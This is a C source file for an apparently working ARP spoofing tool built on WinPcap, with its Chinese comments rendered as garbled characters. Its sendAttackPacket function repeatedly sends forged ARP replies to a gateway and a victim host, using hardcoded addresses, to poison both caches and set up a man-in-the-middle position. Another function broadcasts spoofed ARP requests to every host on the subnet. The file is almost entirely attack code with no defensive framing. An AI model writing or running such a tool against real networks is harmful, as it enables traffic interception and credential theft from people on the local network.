#include "ArpCheater.h"

/*����Mac��ַ�ı�ʾ����*/
int main1(int argc, char *argv[]) {
	unsigned char mac[6] = {0x54, 0xee, 0x75, 0xd8, 0xa0, 0x61 };
	//unsigned char* mac = (unsigned char*)&a;
	printf("����arp��ƭ��,����(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)\n",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	unsigned char receiverMac[6] = { 0 };
	memcpy(receiverMac, mac, 6);
	for (int i = 0; i < 6; i++) {
		printf("%X ", receiverMac[i]);
	}
	putchar(10);


	printf("argc=%d\n",argc);
	printf("argv[0]=%s\n", argv[0]);
	printf("argv[1]=%s\n", argv[1]);

	system("pause");
	return 0;
}


pcap_t *deviceHandler;
pcap_addr_t *pAddress; //������ַ 
unsigned char *packet; //ARP�� 
unsigned long fakeIps; //Ҫαװ�ɵ�IP��ַ 
unsigned long localIp; //IP��ַ 
unsigned long netmask; //��������
unsigned char *mac; //����MAC��ַ 

int main(int argc, char *argv[]) {
	pcap_if_t *allDevices; //��������
	pcap_if_t *device; //ĳ����
	int deviceCount = 0; //��������
	int deviceNumber = 0; //ѡ���ָ�����������

	char errorBuffer[PCAP_ERRBUF_SIZE]; //������Ϣ����

	if (argc != 2) {
		printf("Usage:%s ip(address to cheat).\n", argv[0]);
		return -1;
	}

	/*�Ӳ����б��ȡҪαװ��IP��ַ*/
	fakeIps = inet_addr(argv[1]);
	if (INADDR_NONE == fakeIps)
	{
		fprintf(stderr, "Invalid ip address:%s\n", argv[1]);
		return -1;
	}

	/*��ȡ���������б�*/
	int findResult = pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &allDevices, errorBuffer);
	if (-1 == findResult)
	{
		fprintf(stderr, "%s\n", errorBuffer);
		exit(1);
	}

	for (device = allDevices; NULL != device; device = device->next) {
		printf("%d: %s", ++deviceCount, device->name);
		if (NULL == device->description) {
			printf("(No device available!)\n");
		}
		else
		{
			printf("(%s)\n",device->description);
		}
	}
	/*ѡ��һ���������й���*/
	printf("Enter the interface number(1 - %d):", deviceCount);
	scanf("%d", &deviceNumber);
	/*����û�ѡ���������ų�����Ч��Χ�����˳� */
	if (deviceNumber > deviceCount || deviceNumber < 1) {
		printf("Interface number out of range!");
		/*�ͷ��豸�б�*/
		pcap_freealldevs(allDevices);
		return -1;
	}
	/*����ָ������*/
	for (device = allDevices, deviceCount = 0; deviceCount < deviceNumber - 1; deviceCount++, device = device->next);
	
	/*��ȡ����MAC*/
	mac = getLocalMac(device->name);
	/*Debug*/
	mac[0] = 0x011;


	printf("����arp��ƭ��,����(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X)��ͼαװ��%s\n",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], argv[1]);

	/*������*/
	deviceHandler = pcap_open(device->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errorBuffer);

	if (NULL == deviceHandler)
	{
		fprintf(stderr, "\nUnable to open the adapter, %s is not supported by WinPcap.\n", device->name);
		pcap_freealldevs(allDevices);
		return -1;
	}

	/*��ȡָ���豸��ip����������*/
	for (pAddress = device->addresses; NULL != pAddress; pAddress = pAddress->next) {
		localIp = ((struct sockaddr_in*)pAddress->addr)->sin_addr.s_addr;
		netmask = ((struct sockaddr_in *)pAddress->netmask)->sin_addr.s_addr;
		if(0 == localIp || 0 == netmask) {
			continue;
		}

		/*�жϱ���ip�Ƿ��ָ��ip��ͬһ����*/
		if ((localIp & netmask) != (fakeIps & netmask)) {
			/*�������һ������������������ַ�б�*/
			continue;
		}
		/*��ȡ����������*/
		unsigned long hostSize = ntohl(~netmask);
		/*��ȡ������ַ*/
		unsigned long net = localIp & netmask;
		//Ⱥ�����ݰ�
		//sendPacketToAllHost(hostSize, net);
		//ָ��IP�������ݰ�����arp��������
		sendAttackPacket();
	}

	system("pause");
	return 0;
}

/*
	ָ��IP�������ݰ�,�����������Ĳ���:
	1.ģ��·�ɷ���arpӦ���������(Դ��ַ:·��IP+����MAC,Ŀ���ַ:����������IP+����������MAC)
	2.ģ����������arpӦ�����·��(Դ��ַ:����������IP+����MAC,Ŀ���ַ:·��IP+·��MAC)
*/
void sendAttackPacket() {
	unsigned long IP[2] = { inet_addr("10.253.0.1"), fakeIps};
	//unsigned char Macs[2][6] = { { 0x14,0x30,0x04,0x41,0x8d,0x1b} ,{ 0x54,0xee,0x75,0xd8,0xa0,0x61 } };
	unsigned char Macs[2][6] = { { 0x14,0x30,0x04,0x41,0x8d,0x1b } ,{ 0xF0 ,0x76 ,0x1C ,0x83 ,0xCB ,0xF5 } };
	for (int  j = 0; j < 2000; j++)
	{
		for (int i = 0, j = 1; i < 2; i++, j--)
		{
			/*����ٵ�arp�����,�ﵽ����αװ�ɸ�����ip��ַ��Ŀ��*/
			if (i == 0)
			{
				packet = buildArpReplyDatagram(mac, IP[i], IP[j], Macs[j]);
			}
			else {
				packet = buildArpReplyDatagram(mac, IP[i], IP[j], Macs[j]);
			}
			/*�������ݰ�*/
			int sendResult = pcap_sendpacket(deviceHandler, packet, 60);
			if (sendResult == -1)
			{
				fprintf(stderr, "pcap_sendpacket error.\n");
			}
			else {
				unsigned char *senderIP = (unsigned char*)&IP[i];
				unsigned char *receiverIP = (unsigned char*)&IP[j];
				if (i == 0) {
					printf("·��->����:\n");
					printf("source ip:%d.%d.%d.%d -- source mac:%X-%X-%X-%X-%X-%X\n", 
						senderIP[0], senderIP[1], senderIP[2], senderIP[3],
						mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
					);
					printf("destination ip:%d.%d.%d.%d -- destination mac:%X-%X-%X-%X-%X-%X\n",
						receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
						Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
					);
				}
				else {
					printf("����->·��:\n");
					printf("source ip:%d.%d.%d.%d -- source mac:%X-%X-%X-%X-%X-%X\n",
						senderIP[0], senderIP[1], senderIP[2], senderIP[3],
						mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
					);
					printf("destination ip:%d.%d.%d.%d -- destination mac:%X-%X-%X-%X-%X-%X\n",
						receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
						Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
					);
				}
			}
		}
		//Sleep(50);
	}
}

/*
	Ⱥ�����ݰ�
*/
void sendPacketToAllHost(int hostSize, unsigned long net) {
	for (int i = 0; i < hostSize; i++)
	{
		/*��į�����ĵ�ַ,�����ֽ�˳��*/
		unsigned long destinationIp = net | htonl(i);
		/*����ٵ�arp�����,�ﵽ����αװ�ɸ�����ip��ַ��Ŀ��*/
		packet = buildArpRequestDatagram(mac, fakeIps, destinationIp);
		/*�������ݰ�*/
		int sendResult = pcap_sendpacket(deviceHandler, packet, 60);
		if (sendResult == -1)
		{
			fprintf(stderr, "pcap_sendpacket error.\n");
		}
		else {
			unsigned char *ipFormat = NULL;
			ipFormat = (unsigned char*)&destinationIp;
			printf("%d.%d.%d.%d ���ͳɹ�!\n", ipFormat[0], ipFormat[1], ipFormat[2], ipFormat[3]);
		}
		Sleep(50);
	}
}

/*
	��ȡ����MAC
	@param deviceName ָ�����й����������豸����
*/
unsigned char* getLocalMac(char* deviceName) {
	//+8��ȥ��"rpcap://"
	deviceName = deviceName + 8;
	static u_char mac[6];
	memset(mac, 0, sizeof(mac));
	LPADAPTER adapter = PacketOpenAdapter(deviceName);
	if (NULL == adapter || (adapter->hFile) == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	PPACKET_OID_DATA oidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (NULL == oidData)
	{
		PacketCloseAdapter(adapter);
		return NULL;
	}
	/*Retrieve the adapter MAC querying the NIC driver */
	oidData->Oid = OID_802_3_CURRENT_ADDRESS;
	oidData->Length = 6;
	memset(oidData->Data, 0, 6);
	bool status = PacketRequest(adapter, FALSE, oidData);
	if (TRUE == status)
	{
		memcpy(mac, (u_char *)(oidData->Data), 6);
	}

	free(oidData);
	PacketCloseAdapter(adapter);
	return mac;
}

/*
	��װARPЭ�������
	@param sourceMac ԴMAC
	@param sourceIP ԴIP
	@param destinationIP Ŀ��IP
	@return  Ŀ��MAC
*/
unsigned char* buildArpRequestDatagram(unsigned char* sourceMac, unsigned long sourceIP, unsigned long destinationIP) {
	static ArpDatagram packet;
	/*ARP�����Ŀ��MAC��ַ�ǹ㲥��ַ:FF-FF-FF-FF-FF-FF*/
	memset(packet.ethnetFrame.destinationMac, 0xFF, 6);
	//ԴMAC��ַ
	memcpy(packet.ethnetFrame.sourceMAC, sourceMac, 6);
	//֡���� ARP:0X806
	packet.ethnetFrame.frameType = htons(0x0806);

	//Ӳ������ Ethernet��0x0001 
	packet.arpDatagram.hardwareType = htons(0x01);

	//Ҫӳ���Э���ַ���� IP 0x8000
	packet.arpDatagram.protocolType = htons(0x0800);
	//Ӳ����ַ���� MAC��ַΪ6
	packet.arpDatagram.hardwareAddressLength = 0x06;
	//Э���ַ���� IP��ַΪ4
	packet.arpDatagram.protocolAddressLength = 0x04;
	//�������� ARP����Ϊ1,Ӧ��Ϊ2
	packet.arpDatagram.operationType = htons(0x01);
	//ԴMAC��ַ
	memcpy(packet.arpDatagram.senderMac, sourceMac, 6);
	//ԴIP��ַ
	packet.arpDatagram.senderIP = sourceIP;
	//Ŀ��MAC��ַ,�������Ŀ��MACδ֪,���0����
	memset(packet.arpDatagram.receiverMac, 0, 6);
	//Ŀ��IP��ַ
	packet.arpDatagram.receiverIP = destinationIP;
	//������� 18Bytes
	memset(packet.arpDatagram.padding, 0, sizeof(packet.arpDatagram.padding));

	return (unsigned char*)&packet;
}

/*
	��װARPЭ��Ӧ���
	@param sourceMac ԴMAC
	@param sourceIP ԴIP
	@param destinationIP Ŀ��IP
	@return  ARPЭ��Ӧ���
*/
unsigned char* buildArpReplyDatagram(unsigned char* sourceMac, unsigned long sourceIP,
	unsigned long destinationIP, unsigned char* destinationMac) {
	static ArpDatagram packet;
	/*ARP�����Ŀ��MAC��ַ�ǹ㲥��ַ:FF-FF-FF-FF-FF-FF*/
	memset(packet.ethnetFrame.destinationMac, 0xFF, 6);
	//ԴMAC��ַ
	memcpy(packet.ethnetFrame.sourceMAC, sourceMac, 6);
	//֡���� ARP:0X806
	packet.ethnetFrame.frameType = htons(0x0806);

	//Ӳ������ Ethernet��0x0001 
	packet.arpDatagram.hardwareType = htons(0x01);

	//Ҫӳ���Э���ַ���� IP 0x8000
	packet.arpDatagram.protocolType = htons(0x0800);
	//Ӳ����ַ���� MAC��ַΪ6
	packet.arpDatagram.hardwareAddressLength = 0x06;
	//Э���ַ���� IP��ַΪ4
	packet.arpDatagram.protocolAddressLength = 0x04;
	//�������� ARP����Ϊ1,Ӧ��Ϊ2
	packet.arpDatagram.operationType = htons(0x02);
	//ԴMAC��ַ
	memcpy(packet.arpDatagram.senderMac, sourceMac, 6);
	//ԴIP��ַ
	packet.arpDatagram.senderIP = sourceIP;
	//Ŀ��MAC��ַ
	memcpy(packet.arpDatagram.receiverMac, destinationMac, 6);
	//Ŀ��IP��ַ
	packet.arpDatagram.receiverIP = destinationIP;
	//������� 18Bytes
	memset(packet.arpDatagram.padding, 0, sizeof(packet.arpDatagram.padding));

	return (unsigned char*)&packet;
}